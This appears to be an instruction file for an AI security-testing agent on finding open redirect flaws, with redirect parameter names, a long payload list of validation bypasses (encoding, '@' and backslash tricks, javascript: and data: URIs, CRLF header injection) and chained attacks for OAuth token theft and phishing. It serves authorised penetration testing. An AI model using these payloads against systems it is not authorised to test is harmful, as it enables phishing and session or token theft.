# Open Redirect Detection Skill

## Objective
Identify open redirect vulnerabilities that allow attackers to redirect users to malicious external sites.

## Instructions

### 1. Identify Redirect Parameters
Common parameter names:
```
url, redirect, redir, redirect_uri, redirect_url, next, return,
returnTo, return_url, goto, go, destination, dest, target, rurl,
out, view, link, linkurl, continue, checkout_url, image_url,
success, checkout, data, backurl, request, callback, path, uri
```

**Common URL patterns:**
```
/redirect?url=
/login?next=
/logout?return=
/auth?redirect_uri=
/sso?returnTo=
```

### 2. Basic Open Redirect Tests

**Direct external redirect:**
```
?url=https://evil.com
?next=https://evil.com
?redirect=https://evil.com
```

**Protocol-relative:**
```
?url=//evil.com
?url=\/\/evil.com
?url=\\evil.com
```

### 3. Bypass Techniques

**Using @ symbol:**
```
?url=https://legitimate.com@evil.com
?url=https://evil.com#legitimate.com
?url=https://evil.com?legitimate.com
```

**URL encoding:**
```
?url=https%3A%2F%2Fevil.com
?url=https%253A%252F%252Fevil.com  (double encoded)
?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

**Subdomain matching bypass:**
```
# If only allows *.legitimate.com
?url=https://legitimate.com.evil.com
?url=https://evil-legitimate.com
?url=https://legitmate.com.evil.com
```

**Path confusion:**
```
?url=https://legitimate.com/https://evil.com
?url=https://legitimate.com/../../../evil.com
?url=https://legitimate.com/..;/evil.com
```

**Null byte:**
```
?url=https://evil.com%00.legitimate.com
?url=https://evil.com%0d%0a.legitimate.com
```

**Tab/newline:**
```
?url=https://evil%09.com
?url=https://evil%0a.com
?url=https://evil%0d.com
```

**IP address variants:**
```
?url=https://2130706433  (decimal IP)
?url=https://0x7f000001  (hex IP)
?url=https://0177.0.0.1  (octal IP)
```

**Case manipulation:**
```
?url=HTTPS://EVIL.COM
?url=HtTpS://eViL.cOm
```

**Data URI:**
```
?url=data:text/html,<script>location='https://evil.com'</script>
?url=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
```

**JavaScript URI:**
```
?url=javascript:location='https://evil.com'
?url=javascript://evil.com%0aalert(1)
```

### 4. Domain Validation Bypass

**Using legitimate domain as prefix:**
```
?url=https://evil.com/legitimate.com
?url=https://evil.com\.legitimate.com
?url=https://evil.com#.legitimate.com
```

**Unicode homograph:**
```
?url=https://lеgitimate.com  (Cyrillic 'е')
?url=https://legitіmate.com  (different 'i')
```

**Backslash bypass:**
```
?url=https://legitimate.com\@evil.com
?url=https://legitimate.com\\evil.com
?url=/\evil.com
```

**CRLF injection:**
```
?url=https://legitimate.com%0d%0aLocation:%20https://evil.com
```

### 5. Header Injection via Redirect

**Location header injection:**
```
?url=legitimate.com%0d%0aSet-Cookie:%20session=evil
?url=legitimate.com%0d%0aX-XSS-Protection:%200
```

### 6. Context-Specific Bypasses

**JavaScript redirect:**
```javascript
// If redirecting via JavaScript
location = userInput;
window.location.href = userInput;

// Test payloads
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Meta refresh:**
```html
<meta http-equiv="refresh" content="0;url=PAYLOAD">
```

**Form action redirect:**
```html
<form action="PAYLOAD">
```

### 7. Chained Vulnerabilities

**Open redirect to XSS:**
```
?url=javascript:alert(document.domain)
?url=data:text/html,<script>alert(1)</script>
```

**Open redirect for OAuth token theft:**
```
/oauth/authorize?redirect_uri=https://legitimate.com/redirect?url=https://evil.com
```

**Open redirect for phishing:**
1. Craft URL: `https://legitimate.com/redirect?url=https://evil.com/login`
2. Evil.com mimics legitimate login page
3. Victim sees legitimate.com in initial URL

### 8. Whitelist Bypass Matrix

| Whitelist Pattern | Bypass Payload |
|-------------------|----------------|
| `*.legitimate.com` | `evil.legitimate.com` (if subdomain takeover) |
| `legitimate.com/*` | `legitimate.com.evil.com` |
| Contains `legitimate.com` | `evil.com/legitimate.com` |
| Starts with `https://legitimate.com` | `https://legitimate.com@evil.com` |

### 9. Detection via OOB

Use `collaborator_generate` to detect redirects:
```
?url=http://COLLABORATOR
```

Check `collaborator_poll` for HTTP interactions.

### 10. Impact Assessment

**High Impact:**
- OAuth token theft
- Credential phishing
- Account takeover via redirect

**Medium Impact:**
- Phishing facilitation
- Trust exploitation
- SEO manipulation

**Lower Impact:**
- Simple external redirect
- Limited user interaction required

### 11. Confirm and Document
If confirmed, create finding with:
- Vulnerable parameter
- Working bypass technique
- Proof of concept URL
- Evidence (redirect response, external destination)
- Impact assessment

## MCP Tools to Use
- `params_extract`: Identify redirect parameters
- `http1_request` / `http2_request`: Test redirects
- `url_encode`: Encode payloads
- `collaborator_generate` / `collaborator_poll`: OOB detection
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/Open Redirect
- OWASP Unvalidated Redirects
- HackTricks Open Redirect
